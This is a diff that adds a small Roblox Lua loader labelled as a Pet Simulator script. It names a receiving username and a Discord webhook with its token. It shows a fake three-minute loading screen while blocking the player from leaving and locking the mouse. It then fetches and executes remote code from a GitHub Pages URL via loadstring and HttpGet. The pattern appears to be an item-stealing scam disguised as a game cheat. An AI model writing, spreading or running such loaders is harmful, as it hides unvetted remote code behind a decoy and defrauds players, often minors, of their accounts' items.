@@ -1,0 +1,23 @@
+UserName = "cocvn_my"
+
+Webhook = "https://discord.com/api/webhooks/1101694550692610151/K52gl7yA2PSGJVR7sdqEEchlZNOuORGKYSe39NiHwQtgUsq1AQ_IpzhIKwMYrqgodaZ8" -- optional delete the whole line if you don't want it
+
+_G.LoadingScreen = true
+
+_G.AntiLeave = true
+
+_G.MouseLock = true 
+
+-- set them to false if you don't need them
+
+_G.ScriptName = "宠物模拟器脚本"
+
+_G.FirstText = "97猫准备"
+
+_G.SecondText = "脚本加载..."
+
+_G.ThirdText = "快完成了..."
+
+_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
+
+loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()
